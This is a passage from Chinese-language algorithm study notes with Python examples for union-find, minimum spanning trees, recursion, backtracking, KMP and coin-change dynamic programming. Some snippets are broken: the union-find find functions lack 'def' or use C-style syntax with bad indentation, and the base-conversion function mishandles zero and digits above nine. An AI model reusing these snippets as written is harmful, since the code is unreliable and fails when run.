title="5 拓扑排序"></a>5 拓扑排序</h3><blockquote><p>处理一个DAG，输出顶点的线性序列。广泛应用于依赖事件的排期上。（有先后顺序的多个事件）。</p><p>利用 dfs_visit 从某点出发遍历后续事件，得到事件一个列表。</p></blockquote><h3 id="6-并查集"><a href="#6-并查集" class="headerlink" title="6 并查集"></a>6 并查集</h3><blockquote><p>并查集（Union-find Sets）是一种非常精巧而实用的数据结构，它主要用于处理一些不相交集合的合并问题。一些常见的用途有求连通子图、求最小生成树的Kruskal算法和求最近公共祖先（LCA）等。</p><p>结构：</p><ul><li>init：初始化，让每个结点的父亲都指向自己。</li><li>find：递归寻找指向自己的结点，该结点则为传入结点的最终父亲。</li><li>union：修改结点指向，合并结点。</li></ul><p>find路径压缩：将链表转化成树，每个结点直接指向最终的父亲，不需要再一个个遍历。</p><p>例题：</p><ul><li><a href="https://leetcode.cn/problems/count-unreachable-pairs-of-nodes-in-an-undirected-graph/">2316. 统计无向图中无法互相到达点对数</a></li></ul></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化init（指向祖先，也就是自己）</span></span><br><span class="line">fa = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">n:<span class="built_in">int</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n + <span class="number">1</span>):</span><br><span class="line">        fa[i] = i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询find（递归找祖先）</span></span><br><span class="line">find(i:<span class="built_in">int</span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">if</span> fa[i] == i:</span><br><span class="line">        <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> find(fa[i])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并union（修改祖先进行合并）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">union</span>(<span class="params">i:<span class="built_in">int</span>,j:<span class="built_in">int</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">    i_fa = find(i)</span><br><span class="line">    j_fa = find(j)</span><br><span class="line">    fa[i_fa] = j_fa <span class="comment"># i的祖先指向j的祖先</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 查询find优化（路径压缩）</span></span><br><span class="line"><span class="built_in">int</span> find(i:<span class="built_in">int</span>):</span><br><span class="line">    <span class="keyword">if</span> fa[i] == i:</span><br><span class="line">        <span class="keyword">return</span> i</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">        fa[i] = find(fa[i]) <span class="comment"># 路径压缩</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> fa[i]</span><br></pre></td></tr></table></figure><h3 id="7-最小生成树"><a href="#7-最小生成树" class="headerlink" title="7 最小生成树"></a>7 最小生成树</h3><blockquote><p>Prim算法：</p><p>Kruskal算法：</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Prim算法（AI生成）</span></span><br><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prim</span>(<span class="params">graph</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(graph)</span><br><span class="line">    visited = [<span class="literal">False</span>] * n</span><br><span class="line">    min_heap = [(<span class="number">0</span>, <span class="number">0</span>)]  <span class="comment"># 存储边的权重和结束节点的索引</span></span><br><span class="line">    min_cost = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> min_heap:</span><br><span class="line">        cost, node = heapq.heappop(min_heap)  <span class="comment"># 弹出当前最小权重的边</span></span><br><span class="line">        <span class="keyword">if</span> visited[node]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        visited[node] = <span class="literal">True</span></span><br><span class="line">        min_cost += cost</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> neighbor, weight <span class="keyword">in</span> graph[node]:  <span class="comment"># 遍历与当前节点相邻的节点</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> visited[neighbor]:</span><br><span class="line">                heapq.heappush(min_heap, (weight, neighbor))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> min_cost</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Kruskal算法（AI生成）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnionFind</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n</span>):</span><br><span class="line">        self.parent = <span class="built_in">list</span>(<span class="built_in">range</span>(n))</span><br><span class="line">        self.rank = [<span class="number">0</span>] * n</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">if</span> self.parent[x] != x:</span><br><span class="line">            self.parent[x] = self.find(self.parent[x])</span><br><span class="line">        <span class="keyword">return</span> self.parent[x]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">union</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        root_x = self.find(x)</span><br><span class="line">        root_y = self.find(y)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> root_x == root_y:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> self.rank[root_x] &lt; self.rank[root_y]:</span><br><span class="line">            self.parent[root_x] = root_y</span><br><span class="line">        <span class="keyword">elif</span> self.rank[root_x] &gt; self.rank[root_y]:</span><br><span class="line">            self.parent[root_y] = root_x</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.parent[root_y] = root_x</span><br><span class="line">            self.rank[root_x] += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">kruskal</span>(<span class="params">graph</span>):</span><br><span class="line">    edges = []</span><br><span class="line">    n = <span class="built_in">len</span>(graph)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> j, weight <span class="keyword">in</span> graph[i]:</span><br><span class="line">            edges.append((weight, i, j))</span><br><span class="line">    </span><br><span class="line">    edges.sort()</span><br><span class="line"></span><br><span class="line">    uf = UnionFind(n)</span><br><span class="line">    min_cost = <span class="number">0</span></span><br><span class="line">    num_edges = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> weight, u, v <span class="keyword">in</span> edges:</span><br><span class="line">        <span class="keyword">if</span> uf.union(u, v):</span><br><span class="line">            min_cost += weight</span><br><span class="line">            num_edges += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> num_edges == n - <span class="number">1</span>:  <span class="comment"># 已经找到了n-1条边，形成了最小生成树</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> min_cost</span><br></pre></td></tr></table></figure><hr><h2 id="八、python算法"><a href="#八、python算法" class="headerlink" title="八、python算法"></a>八、python算法</h2><h3 id="1-最大公约数"><a href="#1-最大公约数" class="headerlink" title="1 最大公约数"></a>1 最大公约数</h3><blockquote><p>欧几里得算法 / 辗转相除法：</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">num1,num2</span>):</span><br><span class="line">    <span class="keyword">while</span> num2 != <span class="number">0</span>:</span><br><span class="line">        temp = num1</span><br><span class="line">        num1 = num2</span><br><span class="line">        num2 = temp % num2</span><br><span class="line">    <span class="keyword">return</span> num1</span><br></pre></td></tr></table></figure><h3 id="2-递归"><a href="#2-递归" class="headerlink" title="2 递归"></a>2 递归</h3><blockquote><p><a href="https://pythontutor.com/">模拟树</a></p><p>数量统计递归，可以从上到下传递一个值，也可以从下到上返回一个值。同时维护一个全局变量，每次更新值就更新全局变量。（最大或最小）</p><p>递归三要素：</p><ol><li>递归算法必须有一个基本结束条件。（最小规模问题的直接解决）</li><li>递归算法必须能改变状态向基本结束条件演进。（减小问题规模）</li><li>递归算法必须调用自身。（解决减小了规模的相同问题）</li></ol><p><a href="https://blog.csdn.net/jmh1996/article/details/82827579">master主定理</a> </p><p>mast主定理的递归公式：$T(n)=a*T(n/b)+n^d$，其中 a &gt; 1 , b &gt; 1 , d &gt; 0。</p><ol><li>$a &lt; b^d $||$log_ba &lt; d$，$T(n) = O(n^d)$</li><li>$a = b^d$ || $log_ba = d$，$T(n) = O(n^{log_ba}*log n)$</li><li>$a &gt; b^d$ || $log_ba &gt; d$，$T(n)=O(n^{log_ba})$</li></ol><p>例题：</p><ul><li><a href="https://leetcode.cn/problems/maximum-depth-of-binary-tree/">104. 二叉树的最大深度</a></li><li><a href="https://leetcode.cn/problems/same-tree/">100. 相同的树</a></li><li><a href="https://leetcode.cn/problems/symmetric-tree/">101. 对称二叉树</a></li><li><a href="https://leetcode.cn/problems/balanced-binary-tree/">110. 平衡二叉树</a></li><li><a href="https://leetcode.cn/problems/binary-tree-right-side-view/">199. 二叉树的右视图</a></li></ul></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获得最大递归层数</span></span><br><span class="line">sys.getrecursionlimit()</span><br><span class="line"><span class="comment"># 设置最大递归层数</span></span><br><span class="line">sys.setrecursionlimit(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 递归求和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">nums:<span class="built_in">list</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>] + add(nums[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进制转化</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convertNum</span>(<span class="params">num:<span class="built_in">int</span>,base:<span class="built_in">int</span>=<span class="number">2</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    dic = &#123;<span class="number">1</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;6&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;C&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;E&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;F&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> num &lt; base:</span><br><span class="line">        <span class="keyword">return</span> dic[num]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a,b = <span class="built_in">divmod</span>(num,base)</span><br><span class="line">        <span class="keyword">return</span> convertNum(a,base) + <span class="built_in">str</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二叉树</span></span><br><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree</span>(<span class="params">t:turtle.Turtle,brance_len:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="comment"># 树干太短不画，即递归结束条件</span></span><br><span class="line">    <span class="keyword">if</span> brance_len &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># 画树干</span></span><br><span class="line">        t.forward(brance_len)</span><br><span class="line">        <span class="comment"># 右倾斜20度</span></span><br><span class="line">        t.right(<span class="number">20</span>)</span><br><span class="line">        <span class="comment"># 递归调用，画右边的小数，树干减15</span></span><br><span class="line">        tree(t,brance_len-<span class="number">15</span>)</span><br><span class="line">        <span class="comment"># 向左回40度，即左倾斜20度</span></span><br><span class="line">        t.left(<span class="number">40</span>)</span><br><span class="line">        <span class="comment"># 递归调用，画左边的小数，树干减15</span></span><br><span class="line">        tree(t,brance_len-<span class="number">15</span>)</span><br><span class="line">        <span class="comment"># 向右回20度，即回正</span></span><br><span class="line">        t.right(<span class="number">20</span>)</span><br><span class="line">        <span class="comment"># 海龟回到原位置</span></span><br><span class="line">        t.backward(brance_len)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t = turtle.Turtle()</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.penup()</span><br><span class="line">    t.backward(<span class="number">100</span>)</span><br><span class="line">    t.pendown()</span><br><span class="line">    t.pencolor(<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">    t.pensize(<span class="number">2</span>)</span><br><span class="line">    tree(t,<span class="number">75</span>)</span><br><span class="line">    t.hideturtle()</span><br><span class="line">    turtle.done()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 谢尔宾斯基三角形：</span></span><br><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="comment">#  points表示当前绘制的大三角形的三个顶点，degree表示当前的度，或者级别，必须大于0，才继续绘制，myTurtle是还会作图对象</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sierpinski</span>(<span class="params">points, degree, myTurtle</span>):</span><br><span class="line">    colormap = [<span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;white&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>]</span><br><span class="line">    <span class="comment"># 绘制大三角形，从颜色列表中根据degree选择一种颜色</span></span><br><span class="line">    draw_triangle(points, colormap[degree - <span class="number">1</span>], myTurtle)</span><br><span class="line">    <span class="keyword">if</span> degree &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 绘制左下角三角形</span></span><br><span class="line">        sierpinski([points[<span class="number">0</span>], get_middle(points[<span class="number">0</span>], points[<span class="number">1</span>]), get_middle(points[<span class="number">0</span>], points[<span class="number">2</span>])], degree - <span class="number">1</span>,</span><br><span class="line">                   myTurtle)</span><br><span class="line">        <span class="comment"># 绘制上方的三角形</span></span><br><span class="line">        sierpinski([points[<span class="number">1</span>], get_middle(points[<span class="number">0</span>], points[<span class="number">1</span>]), get_middle(points[<span class="number">1</span>], points[<span class="number">2</span>])], degree - <span class="number">1</span>,</span><br><span class="line">                   myTurtle)</span><br><span class="line">        <span class="comment"># 绘制右下角三角形</span></span><br><span class="line">        sierpinski([points[<span class="number">2</span>], get_middle(points[<span class="number">2</span>], points[<span class="number">1</span>]), get_middle(points[<span class="number">0</span>], points[<span class="number">2</span>])], degree - <span class="number">1</span>,</span><br><span class="line">                   myTurtle)</span><br><span class="line"><span class="comment"># 绘制一个三角形</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_triangle</span>(<span class="params">points, color,myTurtle</span>):</span><br><span class="line">    myTurtle.fillcolor(color)</span><br><span class="line">    myTurtle.up()</span><br><span class="line">    myTurtle.goto(points[<span class="number">0</span>][<span class="number">0</span>],points[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">    myTurtle.down()</span><br><span class="line">    myTurtle.begin_fill()</span><br><span class="line">    <span class="comment"># 绘制左边</span></span><br><span class="line">    myTurtle.goto(points[<span class="number">1</span>][<span class="number">0</span>],points[<span class="number">1</span>][<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># 绘制右边</span></span><br><span class="line">    myTurtle.goto(points[<span class="number">2</span>][<span class="number">0</span>], points[<span class="number">2</span>][<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># 绘制底边</span></span><br><span class="line">    myTurtle.goto(points[<span class="number">0</span>][<span class="number">0</span>], points[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">    myTurtle.end_fill()</span><br><span class="line"><span class="comment"># 用于获取两个点的中间点</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_middle</span>(<span class="params">p1,p2</span>):</span><br><span class="line">    <span class="keyword">return</span> ((p1[<span class="number">0</span>] + p2[<span class="number">0</span>])/<span class="number">2</span>,(p1[<span class="number">1</span>] + p2[<span class="number">1</span>])/<span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 调用代码</span></span><br><span class="line">    myTurtle = turtle.Turtle()</span><br><span class="line">    window = turtle.Screen()</span><br><span class="line">    <span class="comment"># 最大三角形的3个顶点坐标</span></span><br><span class="line">    points = [[-<span class="number">200</span>,-<span class="number">100</span>],[<span class="number">0</span>,<span class="number">200</span>],[<span class="number">200</span>,-<span class="number">100</span>]]</span><br><span class="line">    <span class="comment"># 开始绘制三角形，其实degree为5，直到减小到0为止</span></span><br><span class="line">    sierpinski(points,<span class="number">5</span>,myTurtle)</span><br><span class="line">    <span class="comment"># 将海龟画笔抬起，否则移动海龟画笔会一直绘制直线。</span></span><br><span class="line">    myTurtle.up()</span><br><span class="line">    <span class="comment"># 将海龟画笔移动到200，200的位置，以便原理绘制好的三角形</span></span><br><span class="line">    myTurtle.setpos(<span class="number">200</span>,<span class="number">200</span>)</span><br><span class="line">    <span class="comment"># 显示海龟绘图窗口，绘制完后，单击关闭窗口</span></span><br><span class="line">    window.exitonclick()</span><br></pre></td></tr></table></figure><h3 id="3-回溯"><a href="#3-回溯" class="headerlink" title="3 回溯"></a>3 回溯</h3><h4 id="3-1-普通回溯"><a href="#3-1-普通回溯" class="headerlink" title="3.1 普通回溯"></a>3.1 普通回溯</h4><blockquote><p>同理于递归。</p><p>思路：当前操作？子问题？下一子问题？</p><p>时间复杂度为指数级别 $O(a^n)$，易超时。</p><p>例题：</p><ul><li><a href="https://leetcode.cn/problems/letter-combinations-of-a-phone-number/">17. 电话号码的字母组合</a></li></ul></blockquote><h4 id="3-2-子集型回溯"><a href="#3-2-子集型回溯" class="headerlink" title="3.2 子集型回溯"></a>3.2 子集型回溯</h4><blockquote><p>每个元素选或不选，也可以是选列表之间逗号，而非元素。</p><p>例题：</p><ul><li><a href="https://leetcode.cn/problems/subsets/">78. 子集</a></li><li><a href="https://leetcode.cn/problems/palindrome-partitioning/">131. 分割回文串</a>​</li></ul></blockquote><h4 id="3-3-组合型回溯"><a href="#3-3-组合型回溯" class="headerlink" title="3.3 组合型回溯"></a>3.3 组合型回溯</h4><blockquote><p>组合问题。</p><p>剪枝：后续不存在满足条件的值将直接返回，不再递归。</p><p>例题：</p><ul><li><a href="https://leetcode.cn/problems/combinations/">77. 组合</a></li><li><a href="https://leetcode.cn/problems/combination-sum-iii/">216. 组合总和 III</a></li></ul></blockquote><h3 id="4-分治"><a href="#4-分治" class="headerlink" title="4 分治"></a>4 分治</h3><blockquote><p>将问题分为若干更小规模的部分。通过解决每个小规模部分问题，最后解决大问题。</p></blockquote><h4 id="4-1-优化问题与贪心算法"><a href="#4-1-优化问题与贪心算法" class="headerlink" title="4.1 优化问题与贪心算法"></a>4.1 优化问题与贪心算法</h4><blockquote><p>贪心：每次都试图解决问题尽量大的一部分。（从顶到底依次最优）</p><p>例题：</p><ul><li><a href="https://leetcode.cn/problems/maximum-number-of-consecutive-values-you-can-make/">1798. 你能构造出连续值的最大数目</a></li><li><a href="https://leetcode.cn/problems/find-valid-matrix-given-row-and-column-sums/">1605. 给定行和列的和求可行矩阵</a></li></ul></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找零问题：找钱</span></span><br><span class="line"><span class="comment"># 未改进，存在重复计算</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recMC</span>(<span class="params">coinValueList:<span class="built_in">list</span>,change:<span class="built_in">int</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    minCoins = change</span><br><span class="line">    <span class="keyword">if</span> change <span class="keyword">in</span> coinValueList:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c &lt;= change]:</span><br><span class="line">            numCoins = <span class="number">1</span> + recMC((coinValueList),change - i)</span><br><span class="line">            <span class="keyword">if</span> numCoins &lt; minCoins:</span><br><span class="line">                minCoins = numCoins</span><br><span class="line">    <span class="keyword">return</span> minCoins</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改进，最优解存到列表中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recDC</span>(<span class="params">coinValueList:<span class="built_in">list</span>,change:<span class="built_in">int</span>,knownResults:<span class="built_in">list</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    minCoins = change</span><br><span class="line">    <span class="keyword">if</span> change <span class="keyword">in</span> coinValueList:</span><br><span class="line">        knownResults[change] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> knownResults[change] &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> knownResults[change]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c &lt;= change]:</span><br><span class="line">            numCoins = <span class="number">1</span> + recDC((coinValueList),change - i,knownResults)</span><br><span class="line">            <span class="keyword">if</span> numCoins &lt; minCoins:</span><br><span class="line">                minCoins = numCoins</span><br><span class="line">                knownResults[change] = minCoins</span><br><span class="line">    <span class="keyword">return</span> minCoins</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(recDC([<span class="number">1</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">21</span>,<span class="number">25</span>],<span class="number">63</span>,[<span class="number">0</span>]*<span class="number">64</span>))</span><br></pre></td></tr></table></figure><h4 id="4-2-KMP算法"><a href="#4-2-KMP算法" class="headerlink" title="4.2 KMP算法"></a>4.2 KMP算法</h4><blockquote><p>解决了字符串中找子串的问题。</p><p>时间复杂度：<script type="math/tex">O(n+m)</script></p><p><a href="https://www.bilibili.com/video/BV1AY4y157yL">author::KMP算法代码</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">build_next</span>(<span class="params">patt</span>):</span><br><span class="line">    <span class="built_in">next</span> = [<span class="number">0</span>]</span><br><span class="line">    prefix_len = <span class="number">0</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(patt):</span><br><span class="line">        <span class="keyword">if</span> patt[prefix_len] == patt[i]:</span><br><span class="line">            prefix_len += <span class="number">1</span></span><br><span class="line">            <span class="built_in">next</span>.append(prefix_len)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> prefix_len == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">next</span>.append(<span class="number">0</span>)</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                prefix_len = <span class="built_in">next</span>[prefix_len - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">next</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">kmp_search</span>(<span class="params">string,patt</span>):</span><br><span class="line">    <span class="built_in">next</span> = build_next(patt)</span><br><span class="line">    </span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(string):</span><br><span class="line">        <span class="keyword">if</span> string[i] == patt[j]:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> j &gt; <span class="number">0</span>:</span><br><span class="line">            j = <span class="built_in">next</span>[j - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="built_in">len</span>(patt):</span><br><span class="line">            <span class="keyword">return</span> i - j</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="4-3-动态规划-dp"><a href="#4-3-动态规划-dp" class="headerlink" title="4.3 动态规划  [dp]"></a>4.3 动态规划  [dp]</h4><blockquote><p>把多阶段过程转化为一系列单阶段问题，利用各阶段之间的关系，逐个求解。（从底到顶依次最优）</p><p>同理于回溯：当前操作？子问题？下一子问题？</p><p>例题：</p><ul><li><a href="https://leetcode.cn/problems/house-robber/">198. 打家劫舍</a></li><li><a href="https://leetcode.cn/problems/longest-arithmetic-subsequence/">1027. 最长等差数列</a></li></ul></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 案例：找零</span></span><br><span class="line"><span class="comment"># 找零问题：找钱</span></span><br><span class="line"><span class="comment"># 未改进，只知道个数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dpMakeChange</span>(<span class="params">coinValueList:<span class="built_in">list</span>,change:<span class="built_in">int</span>,minCoins:<span class="built_in">list</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">for</span> cents <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,change + <span class="number">1</span>):</span><br><span class="line">        coinCount = cents</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c &lt;= cents ]:</span><br><span class="line">            <span class="keyword">if</span> minCoins[cents - j] + <span class="number">1</span> &lt; coinCount:</span><br><span class="line">                coinCount = minCoins[cents - j] + <span class="number">1</span></span><br><span class="line">        minCoins[cents] = coinCount</span><br><span class="line">    <span class="keyword">return</span> minCoins[change]</span><br><span class="line"><span class="built_in">print</span>(dpMakeChange([<span class="number">1</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">21</span>,<span class="number">25</span>],<span class="number">63</span>,[<span class="number">0</span>]*<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改进，可以知道找的硬币</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exdpMakeChange</span>(<span class="params">coinValueList:<span class="built_in">list</span>,change:<span class="built_in">int</span>,minCoins:<span class="built_in">list</span>,coinsUsed:<span class="built_in">list</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">for</span> cents <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,change + <span class="number">1</span>):</span><br><span class="line">        coinCount = cents</span><br><span class="line">        newCoin = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c &lt;= cents ]:</span><br><span class="line">            <span class="keyword">if</span> minCoins[cents - j] + <span class="number">1</span> &lt; coinCount:</span><br><span class="line">                coinCount = minCoins[cents - j] + <span class="number">1</span></span><br><span class="line">                newCoin = j</span><br><span class="line">        minCoins[cents] = coinCount</span><br><span class="line">        coinsUsed[cents] = newCoin</span><br><span class="line">    <span class="keyword">return</span> minCoins[change]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printCoins</span>(<span class="params">coinsUsed,change</span>):</span><br><span class="line">    coin = change</span><br><span class="line">    <span class="keyword">while</span> coin &gt; <span class="number">0</span>:</span><br><span class="line">        thisCoin = coinsUsed[coin]</span><br><span class="line">        <span class="built_in">print</span>(thisCoin)</span><br><span class="line">        coin = coin - thisCoin</span><br><span class="line">amnt = <span class="number">63</span></span><br><span class="line">clist = [<span class="number">1</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">21</span>,<span class="number">25</span>]</span><br><span class="line">coinsUsed = [<span class="number">0</span>] * (amnt + <span class="number">1</span>)</span><br><span class="line">coinCount = [<span class="number">0</span>] * (amnt + <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Making change for&quot;</span>,amnt,<span class="string">&quot;requires&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(exdpMakeChange(clist,amnt,coinCount,coinsUsed),<span class="string">&quot;coins&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;They are:&quot;</span>)</span><br><span class="line">printCoins(coinsUsed,amnt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The used list is as follows:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(coinsUsed)</span><br></pre></td></tr></table></figure><h4 id="4-4-区间dp"><a href="#4-4-区间dp" class="headerlink" title="4.4 区间dp"></a>4.4 